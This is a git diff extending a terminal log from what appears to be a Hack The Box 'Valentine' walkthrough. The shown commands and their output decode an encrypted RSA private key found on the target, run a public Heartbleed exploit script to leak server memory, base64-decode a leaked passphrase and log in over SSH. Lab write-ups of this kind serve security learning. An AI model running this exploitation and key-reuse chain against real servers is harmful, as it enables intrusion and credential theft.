4ad2589eb93d88c5cdfb3e7944535d211f927e38
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-05-29 16:10:57 -0400

    Update terminal1.bash

--- Valentine/terminal1.bash
+++ Valentine/terminal1.bash
@@ -46,3 +46,122 @@ Nmap done: 1 IP address (1 host up) scanned in 15.57 seconds
 .
 // @ http://10.10.10.79/dev/hyp_key we see a hex encrypted page. 
 // Can be found in parent directory to this file.
+.
+.
+.
+allenwest1@debian:~/Desktop$ nano hype_key
+allenwest1@debian:~/Desktop$ cat hype_key | xxd -r -p
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+
+DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
+Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
+pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
+p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
+t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
+XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
+aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
++wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
+AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
+r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
+2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
+e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
+09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
+dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
+cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
+pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
+Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
+suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
+l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
+RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+-----END RSA PRIVATE KEY-----
+allenwest1@debian:~/Desktop$ cat hype_key | xxd -r -p > ssh_key
+.
+.
+.
+// Searched for a python exploit of heartbleed online
+.
+.
+.
+allenwest1@debian:~/Desktop$ git clone https://gist.github.com/eelsivart/10174134
+Cloning into '10174134'...
+remote: Enumerating objects: 51, done.
+remote: Total 51 (delta 0), reused 0 (delta 0), pack-reused 51
+Unpacking objects: 100% (51/51), done.
+allenwest1@debian:~/Desktop$ cd 10174134/
+allenwest1@debian:~/Desktop/10174134$ python heartbleed.py 
+
+defribulator v1.16
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+Usage: heartbleed.py server [options]
+
+Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+Options:
+  -h, --help            show this help message and exit
+  -p PORT, --port=PORT  TCP port to test (default: 443)
+  -n NUM, --num=NUM     Number of times to connect/loop (default: 1)
+  -s, --starttls        Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...
+  -f FILEIN, --filein=FILEIN
+                        Specify input file, line delimited, IPs or hostnames
+                        or IP:port or hostname:port
+  -v, --verbose         Enable verbose output
+  -x, --hexdump         Enable hex output
+  -r RAWOUTFILE, --rawoutfile=RAWOUTFILE
+                        Dump the raw memory contents to a file
+  -a ASCIIOUTFILE, --asciioutfile=ASCIIOUTFILE
+                        Dump the ascii contents to a file
+  -d, --donotdisplay    Do not display returned data on screen
+  -e, --extractkey      Attempt to extract RSA Private Key, will exit when
+                        found. Choosing this enables -d, do not display
+                        returned data on screen.
+allenwest1@debian:~/Desktop/10174134$ python heartbleed.py -n 100 -a output 10.10.10.79
+
+defribulator v1.16
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: 10.10.10.79:443, 100 times
+Sending Client Hello for TLSv1.0
+Received Server Hello for TLSv1.0
+
+WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 100 of 100
+##################################################################
+.
+.
+.
+// Then it spit out a bunch of garbage with one line repeating every so often.
+// $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
+.
+.
+.
+allenwest1@debian:~/Desktop/10174134$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
+heartbleedbelievethehype
+allenwest1@debian:~/Desktop/10174134$ cd ..
+allenwest1@debian:~/Desktop$ chmod 600 ssh_key
+allenwest1@debian:~/Desktop$ ssh -i ssh_key hype@10.10.10.79
+The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
+ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'ssh_key': 
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
+hype@Valentine:~$ 
+.
+.
+.
+// Continued in asHype.bash
